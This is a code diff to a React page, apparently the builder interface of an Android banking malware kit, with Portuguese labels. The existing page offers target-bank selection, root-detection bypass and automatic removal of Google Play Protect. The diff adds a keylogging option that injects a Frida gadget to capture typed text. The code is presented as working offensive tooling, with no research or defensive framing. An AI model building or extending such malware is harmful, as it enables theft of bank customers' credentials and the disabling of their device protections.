@@ -18,6 +18,7 @@ export default function APKBuilderPage() {
   const [selectedBank, setSelectedBank] = useState("bb");
   const [enableRootBypass, setEnableRootBypass] = useState(true);
   const [enablePlayProtectBypass, setEnablePlayProtectBypass] = useState(true);
+  const [enableKeylogCapture, setEnableKeylogCapture] = useState(true);
   const [injectAllCountryBanks, setInjectAllCountryBanks] = useState(false);
   const [deliveryMode, setDeliveryMode] = useState<DeliveryMode>("auto");
   const [isBuilding, setIsBuilding] = useState(false);
@@ -73,6 +74,7 @@ export default function APKBuilderPage() {
         bankName: selectedBankName,
         enableRootBypass,
         enablePlayProtectBypass,
+        enableKeylogCapture,
         deliveryMode,
       });
 
@@ -219,6 +221,20 @@ export default function APKBuilderPage() {
                   <span className="text-sm font-medium text-slate-300">Desinstalar Play Protect Automaticamente</span>
                 </label>
                 <p className="text-xs text-slate-500 mt-1">Remove proteção do Google Play automaticamente</p>
+              </div>
+
+              <div className="mb-6">
+                <label className="flex items-center space-x-2">
+                  <input
+                    type="checkbox"
+                    checked={enableKeylogCapture}
+                    onChange={(e) => setEnableKeylogCapture(e.target.checked)}
+                    disabled={isBuilding}
+                    className="rounded border-cyan-400/30 bg-slate-800/50"
+                  />
+                  <span className="text-sm font-medium text-slate-300">⌨️ Captura de Keylogs (Frida)</span>
+                </label>
+                <p className="text-xs text-slate-500 mt-1">Injeta Frida gadget para capturar texto digitado automaticamente</p>
               </div>
 
               <div>
